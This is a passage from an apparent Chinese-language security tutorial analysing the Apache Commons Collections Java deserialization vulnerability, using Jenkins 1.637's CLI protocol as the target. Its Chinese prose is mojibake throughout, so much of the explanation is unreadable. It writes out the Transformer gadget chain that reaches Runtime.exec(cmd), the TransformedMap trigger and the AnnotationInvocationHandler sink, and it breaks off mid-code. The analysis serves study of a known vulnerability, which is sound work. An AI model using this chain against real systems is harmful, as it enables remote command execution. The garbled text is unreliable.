<p>å®é™…å½“ç„¶ä¸ä¼šè¿™ä¹ˆç®€å•ï¼Œæœ‰å¯èƒ½å®ƒæ˜¯æŠŠè‡ªå·±çš„å­—æ®µä½œä¸ºå€¼ä½œä¸ºå‚æ•°è°ƒç”¨äº†æŸä¸ªç±»çš„æ–¹æ³•ï¼Œè€Œé‚£ä¸ªæ–¹æ³•é‡Œå¯¹å‚æ•°åšäº†æŸäº›ä¸å®‰å…¨çš„æ“ä½œï¼Œç”šè‡³æœ‰å¯èƒ½ç»è¿‡å¤šä¸ªç±»å¤šä¸ªæ–¹æ³•è°ƒç”¨ï¼Œå½¢æˆä¸€ä¸ªè°ƒç”¨é“¾ã€‚</p>
<p>è¿™å°±æ˜¯é»˜è®¤çš„ååºåˆ—åŒ–é€»è¾‘çš„ä¸€ä¸ªé€ƒé€¸è¿‡ç¨‹ã€‚</p>
<p>åˆ°è¿™é‡Œä½ å¯èƒ½å·²ç»æƒ³åˆ°äº†ï¼ŒJavaååºåˆ—åŒ–ä¸­<code>readObject()</code>çš„ä½œç”¨å…¶å®å°±ç›¸å½“äºPHPååºåˆ—åŒ–ä¸­çš„é‚£äº›é­”æœ¯æ–¹æ³•ï¼Œä½¿ååºåˆ—åŒ–è¿‡ç¨‹åœ¨ä¸€å®šç¨‹åº¦ä¸Šå—æ§æˆä¸ºå¯èƒ½ï¼Œä½†ä¹Ÿåªæ˜¯å¯èƒ½è€Œå·²ï¼Œæ˜¯å¦çœŸçš„å¯æ§ï¼Œè¿˜æ˜¯éœ€è¦åˆ†ææ¯ä¸ªå¯¹è±¡çš„<code>readObject()</code>å…·ä½“æ˜¯å¦‚ä½•å®ç°çš„ <em>ï¼ˆåˆ«æ€¥ï¼Œåé¢æœ‰ç« èŠ‚ä¼šæœ‰è¯¦ç»†ä»‹ç»ï¼‰</em> ã€‚</p>
<p>æ¥ç€çœ‹ç¬¬äºŒä¸ªé—®é¢˜ï¼š</p>
<ol start="2">
<li>ååºåˆ—åŒ–å¯¹è±¡çš„é<code>Serializable</code>çˆ¶ç±»æ— å‚æ„é€ æ–¹æ³•æ˜¯å¦èƒ½åƒPHPä¸­çš„<code>__construct()</code>ä¸€æ ·è¢«åˆ©ç”¨ï¼Ÿ</li>
</ol>
<p>ç­”æ¡ˆåº”è¯¥æ˜¯ä¸è¡Œçš„ã€‚å› ä¸ºå‰é¢å·²ç»æåˆ°è¿‡ï¼Œæˆ‘ä»¬åªèƒ½å¤Ÿæ§åˆ¶ååºåˆ—åŒ–å¯¹è±¡çš„å­—æ®µå€¼ï¼Œè€ŒJavaä¸PHPä¸åŒçš„æ˜¯ï¼ŒJDKåº•å±‚ä¼šå…ˆè°ƒç”¨æ— å‚æ„é€ æ–¹æ³•å®ä¾‹åŒ–ï¼Œå†è¯»å–åºåˆ—åŒ–çš„å­—æ®µæ•°æ®èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰åŠæ³•å°†å¯æ§çš„å­—æ®µå€¼åœ¨å®ä¾‹åŒ–é˜¶æ®µä¼ å…¥æ„é€ æ–¹æ³•ä¸­å¯¹å…¶å†…éƒ¨é€»è¾‘äº§ç”Ÿå½±å“ã€‚</p>
<p>æœ€åä¸€ä¸ªï¼š</p>
<ol start="3">
<li><code>readResolve()</code>å¯¹ååºåˆ—åŒ–æ¼æ´æœ‰ä»€ä¹ˆå½±å“ï¼Ÿ</li>
</ol>
<p><code>readResolve()</code>åªæ˜¯æ›¿æ¢ååºåˆ—åŒ–ç»“æœå¯¹è±¡ï¼Œè‹¥æ˜¯ç»“æœå¯¹è±¡æœ¬èº«å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå®ƒæœ‰å¯èƒ½è®©é—®é¢˜ä¸­æ–­ï¼›è‹¥æ˜¯<code>readObject()</code>å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå®ƒæ— æ³•é¿å…ã€‚</p>
<h3 id="ç»å…¸çš„Apache-Commons-Collections"><a href="#ç»å…¸çš„Apache-Commons-Collections" class="headerlink" title="ç»å…¸çš„Apache Commons Collections"></a>ç»å…¸çš„Apache Commons Collections</h3><p>å¥½ï¼Œæœ‰äº†ä¸Šé¢çš„åŸºç¡€ï¼Œæˆ‘ä»¬ä¹Ÿç…§ä¸€å›æƒ¯ä¾‹ï¼Œå¸¦å¤§å®¶ä¸€èµ·åˆ†æä¸€ä¸‹Javaå†å²ä¸Šæœ€å‡ºåä¹Ÿæ˜¯æœ€å…·ä»£è¡¨æ€§çš„Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>ç½‘ä¸Šå¾ˆå¤šæ–‡ç« éƒ½æ˜¯ä»¥WebLogicä¸ºæ¼æ´ç¯å¢ƒï¼Œæˆ‘ä»¬å°Šé‡å¼€æºï¼Œå›´ç»•1.637ç‰ˆæœ¬çš„Jenkinsæ¥å¼€ä¸ªå¤´ï¼Œå…ˆç®€å•çœ‹çœ‹å®ƒçš„Cliç»„ä»¶çš„ååºåˆ—åŒ–åœºæ™¯ <em>ï¼ˆè¿™é‡Œåªä»¥CLI-connectåè®®ä¸ºä¾‹ï¼ŒCLI2-connectä¼šå¤šå‡ºæ¥ä¸€ä¸ªSSLåŠ è§£å¯†çš„è¿‡ç¨‹ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¤šå…¬å¼€PoCåœ¨æ¨¡æ‹ŸCliæ¡æ‰‹æ—¶é€‰æ‹©CLI-connectåè®®çš„åŸå› ï¼‰</em> ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯å‘å‘é€ä¸€ä¸ªUTF8å­—ç¬¦ä¸²<code>Protocol:CLI-connect</code>ï¼Œå‰ä¸¤ä½ä¸ºå­—ç¬¦ä¸²é•¿åº¦</li>
<li>æœåŠ¡ç«¯<code>TcpSlaveAgentListener</code>åœ¨æ¥æ”¶åˆ°æ•°æ®ä¹‹åï¼Œä¼šåˆ›å»ºä¸€ä¸ª<code>ConnectionHandler</code>å¯¹è±¡è¯»å–ä¸€ä¸ªUTF8å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­åè®®ç‰ˆæœ¬ï¼Œäº¤ç»™å¯¹åº”çš„åè®®è¿›è¡Œå¤„ç†<ul>
<li><code>CliProtocol</code>å“åº”<code>Welcome</code>å­—ç¬¦ä¸²ï¼Œç”±<code>ChannelBuilder</code>ä¸ºä¸¤ç«¯åˆ›å»ºä¸€ä¸ªåŒ…å«äº†<code>Connection</code>å¯¹è±¡ <em>ï¼ˆIOæµå¯¹è±¡åœ¨é‡Œé¢ï¼‰</em> çš„<code>Channel</code>é€šä¿¡é€šé“ï¼Œå¹¶è°ƒç”¨<code>negotiate()</code>è¿›è¡Œäº¤äº’<ul>
<li><code>Capability.writePreamble()</code>å“åº”åºåˆ—åŒ–åçš„<code>Capability</code>å¯¹è±¡ï¼Œå…¶ä¸­ä½¿ç”¨<code>Mode.TEXT.wrap()</code>å°†è¾“å‡ºæµåŒ…è£…ä¸º<code>BinarySafeStream</code>ï¼Œå®ƒä¼šåœ¨å†™æ—¶è¿›è¡ŒBase64ç¼–ç </li>
<li>ç”±äº<code>ChannelBuilder</code>åœ¨buildä¹‹å‰ï¼Œè°ƒç”¨äº†<code>withMode()</code>è®¾ç½®<code>mode</code>ä¸º<code>Mode.BINARY</code>ï¼Œå› æ­¤è¿˜ä¼šå“åº”ä¸€ä¸ª<code>0x00000000</code></li>
<li>ç­‰å¾…æ¥æ”¶åç»­æ•°æ®ï¼Œåˆ¤æ–­æ•°æ®å†…å®¹å‰ç¼€ä¸º<code>Capability.PREAMBLE</code> <em>ï¼ˆ<code>&lt;===[JENKINS REMOTING CAPACITY]===&gt;</code>ï¼‰</em> æ—¶ï¼Œå°†<code>InputStream</code>ä¼ ç»™<code>Capability.read()</code><ul>
<li><code>Capability</code>åŒæ ·ä¼šå¯¹è¾“å…¥æµåšä¸€æ¬¡<code>BinarySafeStream</code>åŒ…è£…ï¼Œä¿è¯åœ¨è¯»æ•°æ®æ—¶è§£ç å¾—åˆ°åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼Œå†æ‰”ç»™è¾“å…¥æµçš„<code>readObject()</code>ç»§ç»­è¯»</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>å›çœ‹<code>Connection</code>ä¸­è‡ªå®šä¹‰çš„<code>readObject()</code>ï¼Œæ˜¯ä¸€ä¸ªæ™®æ™®é€šé€šçš„<code>ObjectInputStream</code>ååºåˆ—åŒ–ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç°åœ¨æˆ‘ä»¬å‡è®¾å·²çŸ¥1.637ç‰ˆæœ¬çš„Jenkinså¼•ç”¨äº†å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„Commons Collectionsçš„ç‰ˆæœ¬çš„JaråŒ…ï¼Œé‚£ä¹ˆåªéœ€è¦åˆ©ç”¨å®ƒæ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡çš„åºåˆ—åŒ–ä¸²ï¼Œåœ¨ä¸Jenkins Cliå®Œæˆæ¡æ‰‹ä¹‹åï¼Œå°†å…¶Base64ç¼–ç åçš„å­—ç¬¦ä¸²å‘é€è¿‡å»å°±è¡Œäº† <em>ï¼ˆå½“ç„¶ï¼Œåƒä¸‡åˆ«å¿˜äº†å‰é¢é‚£ä¸²é…·é…·çš„å‰ç¼€ï¼‰</em> ã€‚</p>
<hr>
<h2 id="Payloadæ„é€ "><a href="#Payloadæ„é€ " class="headerlink" title="Payloadæ„é€ "></a>Payloadæ„é€ </h2><p>å¥½çš„ï¼Œç°åœ¨è®©æˆ‘ä»¬èšç„¦åˆ°Commons Collectionså†…éƒ¨ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯å¦‚ä½•åˆ©ç”¨å®ƒæ¥è®©åº”ç”¨ã€äº§ç”Ÿã€é—®é¢˜çš„ã€‚</p>
<p>æˆ‘ä»¬å…ˆé¢„å¤‡ä¸€ä¸ªåŸºæœ¬çŸ¥è¯†ï¼Œåœ¨Javaä¸­ï¼Œè‹¥æƒ³é€šè¿‡å…¶åŸç”ŸJDKæä¾›çš„æ¥å£æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæœ€å¸¸è§çš„è¯­å¥å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);</span><br></pre></td></tr></table></figure></div>

<p>å¾ˆç®€å•ï¼Œä¸€ä¸ªå•ä¾‹æ¨¡å¼çš„æ–¹æ³•è·å–åˆ°<code>Runtime</code>çš„å®ä¾‹ï¼Œå†è°ƒç”¨å®ƒçš„<code>exec()</code>æ‰§è¡Œå‘½ä»¤ã€‚åœ¨è¡¨è¾¾å¼æ³¨å…¥ç±»RCEæ¼æ´ä¸­ä¹Ÿå¯ä»¥é¢‘ç¹çœ‹åˆ°åˆ©ç”¨å„ç§æ¡ä»¶ç‰¹æ€§æ¥æ„é€ è¿™æ®µè¯­å¥çš„èº«å½±ï¼Œæ¯”å¦‚Struts2çš„OGNLï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(cmd)</span><br></pre></td></tr></table></figure></div>

<p>åˆæ¯”å¦‚Springçš„SpELï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæ›¿å°ç™½é—®ä¸ªåŸºç¡€ä½†åˆå’Œæ¥ä¸‹æ¥çš„å†…å®¹æœ‰å…³çš„é—®é¢˜ï¼šä¸ºä»€ä¹ˆéƒ½è¦ä½¿ç”¨é“¾å¼ç»“æ„ï¼Ÿ</p>
<p>åŸå› å…¶å®å¾ˆç®€å•ï¼Œå› ä¸ºæ— è®ºæ˜¯è¡¨è¾¾å¼è§£ææ‰§è¡Œè¿˜æ˜¯ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚é€šè¿‡åå°„æŠ€æœ¯è·å–å¯¹è±¡è°ƒç”¨å‡½æ•°éƒ½ä¼šå­˜åœ¨ä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä½¿ç”¨é“¾å¼ç»“æ„çš„è¯­å¥å¯ä»¥ä¿è¯æ‰§è¡Œè¿‡ç¨‹ä¸­è¿™ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€è‡´çš„ã€‚ä½ ä¹Ÿå¯ä»¥æ¢ä¸ªæ–¹å¼é—®è‡ªå·±ï¼Œå¦‚æœä½ ç¬¬ä¸€æ¬¡è¯·æ±‚<code>Runtime.getRuntime()</code>ï¼Œé‚£å¦‚ä½•ä¿è¯ç¬¬äºŒæ¬¡è¯·æ±‚<code>rt.exec()</code>èƒ½å¤Ÿæ‹¿åˆ°ç¬¬ä¸€æ¬¡çš„<code>Runtime</code>å¯¹è±¡å‘¢ï¼Ÿ</p>
<p>äº†è§£äº†è¿™ä¸ªé—®é¢˜ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å°è¯•ç”¨Commons Collectionså…ˆæ¥æ„é€ è¿™ä¸ªé“¾å¼ç»“æ„äº†ã€‚</p>
<p>å‰è¾ˆä»¬ä¸ºæˆ‘ä»¬åœ¨Commons Collectionsä¸­æ‰¾åˆ°äº†ä¸€ä¸ªç”¨äºå¯¹è±¡ä¹‹é—´è½¬æ¢çš„<code>Transformer</code>æ¥å£ï¼Œå®ƒæœ‰å‡ ä¸ªæˆ‘ä»¬ç”¨å¾—ç€çš„å®ç°ç±»ï¼š</p>
<ol>
<li><code>ConstantTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><code>InvokerTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><code>ChainedTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</li>
</ol>
<p>åˆ©ç”¨è¿™å‡ ä¸ªå¯¹è±¡ï¼Œå¯ä»¥æ„é€ å‡ºä¸‹é¢è¿™æ¡é“¾ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">        new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br><span class="line">Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans);</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ï¼Œæ•°ç»„çš„ä¸­é—´ä¸¤ä¸ªå…ƒç´ æ˜¯æœ€è®©äººè´¹è§£çš„ï¼Œæˆ‘ä»¬ä¸€å¥ä¸€å¥æ¥è§£é‡Š <em>ï¼ˆå‰æ–¹é«˜èƒ½é¢„è­¦ï¼Œè¯·å¯¹ç…§ä¸Šé¢å‡ ä¸ª<code>Transformer</code>çš„é€»è¾‘ä»”ç»†çœ‹ï¼Œæ¥ä¸‹æ¥çš„å†…å®¹ç½‘ä¸Šæœ‰äº›è§£é‡Šæ˜¯å­˜åœ¨å‡ºå…¥çš„ï¼‰</em> ï¼š</p>
<ol>
<li>æ„é€ ä¸€ä¸ª<code>ConstantTransformer</code>ï¼ŒæŠŠ<code>Runtime</code>çš„<code>Class</code>å¯¹è±¡ä¼ è¿›å»ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œå§‹ç»ˆä¼šè¿”å›è¿™ä¸ªå¯¹è±¡</li>
<li>æ„é€ ä¸€ä¸ª<code>InvokerTransformer</code>ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸º<code>getMethod</code>ï¼Œå‚æ•°ä¸º<code>getRuntime</code>ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼ å…¥1çš„ç»“æœï¼Œæ­¤æ—¶çš„<code>input</code>åº”è¯¥æ˜¯<code>java.lang.Runtime</code>ï¼Œä½†ç»è¿‡<code>getClass()</code>åï¼Œ<code>cls</code>ä¸º<code>java.lang.Class</code>ï¼Œä¹‹åçš„<code>getMethod()</code>åªèƒ½è·å–<code>java.lang.Class</code>çš„æ–¹æ³•ï¼Œå› æ­¤æ‰ä¼šå®šä¹‰çš„å¾…è°ƒç”¨æ–¹æ³•åä¸º<code>getMethod</code>ï¼Œç„¶åå…¶å‚æ•°æ‰æ˜¯<code>getRuntime</code>ï¼Œå®ƒå¾—åˆ°çš„æ˜¯<code>getMethod</code>è¿™ä¸ªæ–¹æ³•çš„<code>Method</code>å¯¹è±¡ï¼Œ<code>invoke()</code>è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæœ€ç»ˆå¾—åˆ°çš„æ‰æ˜¯<code>getRuntime</code>è¿™ä¸ªæ–¹æ³•çš„<code>Method</code>å¯¹è±¡</li>
<li>æ„é€ ä¸€ä¸ª<code>InvokerTransformer</code>ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸º<code>invoke</code>ï¼Œå‚æ•°ä¸ºç©ºï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼ å…¥2çš„ç»“æœï¼ŒåŒç†ï¼Œ<code>cls</code>å°†ä¼šæ˜¯<code>java.lang.reflect.Method</code>ï¼Œå†è·å–å¹¶è°ƒç”¨å®ƒçš„<code>invoke</code>æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨ä¸Šé¢çš„<code>getRuntime()</code>æ‹¿åˆ°<code>Runtime</code>å¯¹è±¡</li>
<li>æ„é€ ä¸€ä¸ª<code>InvokerTransformer</code>ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸º<code>exec</code>ï¼Œå‚æ•°ä¸ºå‘½ä»¤å­—ç¬¦ä¸²ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼ å…¥3çš„ç»“æœï¼Œè·å–<code>java.lang.Runtime</code>çš„<code>exec</code>æ–¹æ³•å¹¶ä¼ å‚è°ƒç”¨</li>
<li>æœ€åæŠŠå®ƒä»¬ç»„è£…æˆä¸€ä¸ªæ•°ç»„å…¨éƒ¨æ”¾è¿›<code>ChainedTransformer</code>ä¸­ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼šå°†å‰ä¸€ä¸ªå…ƒç´ çš„è¿”å›ç»“æœä½œä¸ºä¸‹ä¸€ä¸ªçš„å‚æ•°ï¼Œåˆšå¥½æ»¡è¶³éœ€æ±‚</li>
</ol>
<p>æ—¢ç„¶ç¬¬2ã€3æ­¥è¿™ä¹ˆç»•ï¼Œæˆ‘ä»¬åˆçŸ¥é“äº†ä¸ºä»€ä¹ˆï¼Œæ˜¯ä¸æ˜¯å¯ä»¥è€ƒè™‘ç”¨ä¸‹é¢è¿™ç§é€»è¾‘æ›´æ¸…æ™°çš„æ–¹å¼æ¥æ„é€ å‘¢ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure></div>

<p>ç­”æ¡ˆæ˜¯ä¸è¡Œçš„ã€‚è™½ç„¶å•çœ‹æ•´ä¸ªé“¾ï¼Œæ— è®ºæ˜¯å®šä¹‰è¿˜æ˜¯æ‰§è¡Œéƒ½æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨åç»­åºåˆ—åŒ–æ—¶ï¼Œç”±äº<code>Runtime.getRuntime()</code>å¾—åˆ°çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿéœ€è¦å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè€Œ<code>Runtime</code>æœ¬èº«æ˜¯æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£çš„ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´åºåˆ—åŒ–å¤±è´¥ã€‚</p>
<p>ä¹Ÿæœ‰åŒå­¦å¯èƒ½çœ‹è¿‡ysoserialæ„é€ çš„Payloadï¼Œå®ƒçš„ä¹ æƒ¯æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªåŒ…å«ã€æ— æ•ˆã€<code>Transformer</code>çš„<code>ChainedTransformer</code>ï¼Œç­‰æ‰€æœ‰å¯¹è±¡è£…å¡«å®Œæ¯•ä¹‹åå†åˆ©ç”¨åå°„å°†å®é™…çš„æ•°ç»„æ”¾è¿›å»ã€‚è¿™ä¹ˆåšçš„åŸå› ä½œè€…ä¹Ÿåœ¨ä¸€ä¸ª<a href="https://github.com/frohoff/ysoserial/issues/32" target="_blank" rel="noopener">Issue</a>ä¸­ç»™äº†è§£é‡Šï¼Œæˆ‘ä»¬ç›´æ¥çœ‹åŸæ–‡ï¼š</p>
<blockquote>
<p>Generally any reflection at the end of gadget-chain set up is done to â€œarmâ€ the chain because constructing it while armed can result in premature â€œdetonationâ€ during set-up and cause it to be inert when serialized and deserialized by the target application.</p>
</blockquote>
<p>ç°åœ¨ï¼Œæœ‰äº†è¿™æ¡<code>Transformer</code>é“¾ï¼Œå°±ç­‰ç€è°æ¥æ‰§è¡Œå®ƒçš„<code>transform()</code>äº†ã€‚</p>
<p>ç½‘ä¸Šæµä¼ çš„ç¤ºä¾‹å¾ˆå¤šéƒ½æ˜¯ä½¿ç”¨ä¸€ä¸ªåä¸º<code>TransformedMap</code>çš„è£…é¥°å™¨æ¥è§¦å‘<code>transform()</code>ï¼Œå®ƒåœ¨è£…é¥°æ—¶ä¼šä¼ å…¥åŸå§‹<code>Map</code>ã€ä¸€ä¸ªé”®è½¬æ¢å™¨<code>Transformer</code>å’Œä¸€ä¸ªå€¼è½¬æ¢å™¨<code>Transformer</code>ï¼Œè€Œå®ƒçš„çˆ¶ç±»åœ¨å†…éƒ¨å®ç°äº†ä¸€ä¸ª<code>AbstractMapEntryDecorator</code>çš„å­ç±»ï¼Œä¼šåœ¨<code>setValue()</code>å‰è°ƒç”¨<code>checkSetValue()</code>è¿›è¡Œæ£€æŸ¥ï¼Œè€Œ<code>TransformedMap.checkSetValue()</code>ä¼šè°ƒç”¨å®ƒçš„å€¼è½¬æ¢å™¨çš„<code>transform()</code>ï¼Œå› æ­¤è£…é¥°ä»»æ„ä¸€ä¸ªæœ‰å…ƒç´ çš„<code>Map</code>å°±å¯ä»¥æ»¡è¶³éœ€æ±‚ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map m = TransformedMap.decorate(<span class="keyword">new</span> HashMap()&#123;&#123; put(<span class="string">"value"</span>, <span class="string">"anything"</span>); &#125;&#125;, <span class="keyword">null</span>, chain);</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦å†æ‰¾ä¸€ä¸ªåŒ…å«å¯æ§<code>Map</code>å­—æ®µï¼Œå¹¶ä¼šåœ¨ååºåˆ—åŒ–æ—¶å¯¹è¿™ä¸ª<code>Map</code>è¿›è¡Œ<code>setValue()</code>æˆ–<code>get()</code>æ“ä½œçš„å…¬å…±å¯¹è±¡ã€‚</p>
<p>å¹¸è¿çš„æ˜¯ï¼Œå‰è¾ˆä»¬åœ¨JDKè¾ƒæ—©çš„ç‰ˆæœ¬ä¸­å‘ç°äº†<code>AnnotationInvocationHandler</code>è¿™ä¸ªå¯¹è±¡ <em>ï¼ˆè¾ƒæ–°ç‰ˆæœ¬çš„JDKå¯ä»¥ä½¿ç”¨<code>BadAttributeValueExpException</code>ï¼Œåœ¨è¿™é‡Œå°±ä¸å±•å¼€äº†ï¼‰</em> ï¼Œå®ƒåœ¨åˆå§‹åŒ–æ—¶å¯ä»¥ä¼ å…¥ä¸€ä¸ª<code>Map</code>ç±»å‹å‚æ•°èµ‹å€¼ç»™å­—æ®µ<code>memberValues</code>ï¼Œ<code>readObject()</code>è¿‡ç¨‹ä¸­å¦‚æœæ»¡è¶³ä¸€å®šæ¡ä»¶å°±ä¼šå¯¹<code>memberValues</code>ä¸­çš„å…ƒç´ è¿›è¡Œ<code>setValue()</code>ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    s.<span class="title">defaultReadObject</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; 